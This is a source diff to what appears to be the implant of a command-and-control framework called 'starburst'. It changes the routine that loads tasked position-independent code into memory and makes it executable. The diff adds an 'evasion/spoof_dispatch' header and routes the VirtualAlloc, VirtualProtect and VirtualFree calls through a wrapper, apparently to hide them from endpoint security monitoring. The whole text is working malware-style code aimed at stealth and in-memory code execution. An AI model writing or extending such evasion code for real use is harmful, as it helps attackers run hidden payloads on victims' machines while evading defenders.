@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_LOAD
 
@@ -44,7 +45,7 @@ auto declfn starburst::cmd_load(
 
     DBG_PRINT( inst, "cmd_load: %u bytes, init_offset=%u\n", pic_len, init_offset );
 
-    LPVOID mem = inst.kernel32.VirtualAlloc(
+    LPVOID mem = (LPVOID)SCALL( inst, kernel32.VirtualAlloc,
         nullptr, pic_len,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
@@ -57,11 +58,11 @@ auto declfn starburst::cmd_load(
     memory::copy( mem, pic_start, pic_len );
 
     DWORD old_protect = 0;
-    inst.kernel32.VirtualProtect( mem, pic_len, PAGE_EXECUTE_READ, &old_protect );
+    SCALL( inst, kernel32.VirtualProtect, mem, pic_len, PAGE_EXECUTE_READ, &old_protect );
 
     uint32_t slots_available = inst.MAX_LOADED_COMMANDS - inst.loaded.count;
     if ( slots_available == 0 ) {
-        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "no command slots available" ) ) );
         return;
@@ -76,7 +77,7 @@ auto declfn starburst::cmd_load(
         static_cast<int>( slots_available ) );
 
     if ( registered <= 0 ) {
-        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "module init failed" ) ) );
         return;
